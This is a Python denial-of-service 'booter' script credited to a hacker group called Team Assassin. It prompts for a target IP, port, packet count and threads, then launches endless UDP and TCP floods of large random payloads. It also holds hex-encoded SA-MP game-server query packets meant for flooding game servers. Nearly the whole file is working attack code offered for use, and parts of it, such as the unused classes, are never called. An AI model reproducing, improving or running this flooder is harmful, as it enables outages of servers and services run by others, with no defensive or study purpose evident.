	#AUTHOR : Karasko
#SUBSCRIBE Dev karasko
import random
import threading
import codecs
import struct
import time
import socket
import sys
import os
import logging


os.system("clear")
print("""
\x1b[1;31;40;17m
KARASKO TEAM ASSASSIN NIK YMAK
\x1b[1;32;48;20m
╔═══╗─╔╗──────      
╚╗╔╗║─║║──────        
─║║║╠═╝╠══╦══╗   
─║║║║╔╗║╔╗║══╣      
╔╝╚╝║╚╝║╚╝╠══║           
╚═══╩══╩══╩══╝    
\033[1;33m   
KARASKO THE BEAST DEV python   
\033[1;34m
╔═══╗╔╗─╔╗─────╔╗──              
║╔═╗╠╝╚╦╝╚╗────║║──            
║║─║╠╗╔╩╗╔╬══╦═╣║╔╗       
║╚═╝║║║─║║║╔╗║╔╣╚╝╝               
║╔═╗║║╚╗║╚╣╔╗║╚╣╔╗╗      
╚╝─╚╝╚═╝╚═╩╝╚╩═╩╝╚╝    
\033[1;36m   
karasko Big Lider in team assassin
\033[1;32m
𝐊𝐀𝐑𝐀𝐒𝐊𝐎  
\033[1;31m
""")
# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
class Zer0IpBooter:
    def __init__(self, target_ip, target_port, attack_type, duration, proxies):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type
        self.duration = duration
        self.proxies = proxies
        self.packet_count = 0
        self.packet_size = 1024  # packet size
        self.stop_event = threading.Event()
        self.start_time = time.time()
ip = str(input(" Target Ip:                                                              "))
port = int(input(" Target Port:                                                            "))
choice = str(input("Thb Tnik  Serveur? (y/n):"))
times = int(input(" Packet:                                                                 "))
threads = int(input(" Threads:                                                                 "))
fake_ip = '182.11.20.30'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(146000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			print("[!]TEAM AS TNIK KOLL!!")

def run2():
	data = random._urandom(120004)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM AS TNIK KOLL!!")
            

def run3():
	data = random._urandom(999000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM AS TNIK KOLL!!")
            
  
def run4():
	data = random._urandom(810008)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM AS TNIK KOLL!!!")
			
def run5():
	data = random._urandom(160000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM AS TNIK KOLL!!!")
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                
     
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()